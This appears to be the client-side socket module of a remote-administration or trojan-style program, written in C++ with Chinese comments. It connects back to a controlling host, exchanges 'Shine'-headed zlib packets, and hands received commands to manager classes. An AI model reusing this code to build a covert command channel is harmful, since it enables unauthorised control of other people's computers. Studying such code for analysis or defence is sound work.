#include "StdAfx.h"
#include "ClientSocket.h"
#include "Common.h"
#include "zlib.h"
#include <iostream>
using namespace std;






CClientSocket::CClientSocket()
{
	//初始化套接字库
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);                      
	m_hEvent = CreateEvent(NULL, true, false, NULL);   
	m_bIsRunning    = false;
	m_hWorkerThread = NULL;
	m_Socket = INVALID_SOCKET;
	BYTE bPacketFlag[] = {'S', 'h', 'i', 'n', 'e'};                //数据包的头
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}


CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);   //等待工作线程退出
	
	if (m_Socket != INVALID_SOCKET)
	{
		Disconnect();                                 //断开连接函数
	}
	
	CloseHandle(m_hWorkerThread);                     //关闭线程事件句柄
	CloseHandle(m_hEvent);                     
	WSACleanup();
}




void CClientSocket::Disconnect()
{
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, 
		(char *)&lingerStruct, sizeof(lingerStruct) );
	
	CancelIo((HANDLE)m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);     //通知工作线程退出的信号
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	  


	cout<<"ShutDown"<<endl;
	
	m_Socket = INVALID_SOCKET;
}




//---向主控端发起连接
bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	//一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;
	
	//创建连接的套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}
	
	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);
	
	if (pHostent == NULL)
	{
		return false;
	}
	
	//构造sockaddr_in结构 也就是主控端的结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return false;
	}

	// 不用保活机制，自己用心跳实瑞
	
	const char chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5;  // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}
	
	m_bIsRunning = true;
	//连接成功，开启工作线程  转到WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
	
	return true;
}




DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];

	fd_set fdSocket;
	
	FD_ZERO(&fdSocket);
	
	FD_SET(pThis->m_Socket, &fdSocket);
	
	while (pThis->IsRunning())                //如果主控端 没有退出，就一直陷在这个循环中
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);   //这里判断是否断开连接
		if (nRet == SOCKET_ERROR)      
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);     //接收主控端发来的数据
			if (nSize <= 0)
			{
				pThis->Disconnect();//接收错误处理
				break;
			}
			if (nSize > 0) 
			{
				pThis->OnRead((LPBYTE)buff, nSize);   //正确接收就调用 OnRead处理 转到OnRead
			}
		}
	}
	
	return -1;
}


//接受数据
void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();       //错误处理
			return;
		}

		//shine

		//数据包错误 要求重新发送
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
	

		//以下接到数据进行解压缩
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);
		
		
	
		//检测数据是否大于数据头大小 如果不是那就不是正确的数据
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			//判断数据头
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw "Bad Buffer";
			}
			
			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			
			//--- 数据的大小正确判断
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				//得到传输来的数据

				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
			
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad Allocate";
				
				m_CompressionBuffer.Read(pData, nCompressLength);
				
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
		

				if (nRet == Z_OK)//如果解压成功
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
	
					//解压好的数据和长度传递给对象Manager进行处理 注意这里是用了多态
					//由于m_pManager中的子类不一样造成调用的OnReceive函数不一样
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), 
						m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "Bad Buffer";
				
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}catch(...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
	
}



//发送数据
int CClientSocket::Send( LPBYTE lpData, UINT nSize)   //10
{
	
	m_WriteBuffer.ClearBuffer();
	
	if (nSize > 0)
	{
		//乘以1.001是以最坏的也就是数据压缩后占用的内存空间和原先一样 +12 防止缓冲区溢出

		//压缩数据
		unsigned long	destLen = (double)nSize * 1.001  + 12;  //10 6
		LPBYTE			pDest = new BYTE[destLen];              //new   22  vir
		
		if (pDest == NULL)
		{
			return 0;
		}
		
		int	nRet = compress(pDest, &destLen, lpData, nSize);   //压缩数据
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}
		



		//构建数据包 35
         
	    //S h i n e 000X 000A HelloWorld
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;    //加入我们数据包各种头部
	
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag)); 
		//数据包的标志Shine 5个字节
		
	
		
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));    
		//整个数据包的大小  4个字节
	
		
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));         
		//数据包原始(压缩前)的大小 4个字节

		m_WriteBuffer.Write(pDest, destLen);                        
		
		//压缩后的数据
		delete [] pDest;
		
	
		//备份原始数据没有被压缩  Hello   Send  -->   10 
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();  //1024
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}
	
	// 分块发送  //Base 1025
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), 
		MAX_SEND_BUFFER);
}


                                 //Base         1025       2049  1024  1024  1
int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;   //1024
		pbuf += nSplitSize;
		Sleep(10); //过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
	{
		return nSend;
	}
	else
	{
		return SOCKET_ERROR;
	}
}




bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}


void CClientSocket::setManagerCallBack(CManager *pManager)   //Kernel 
{
	m_pManager = pManager;           //m_pManager父类指针
}



void CClientSocket::RunEventLoop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}
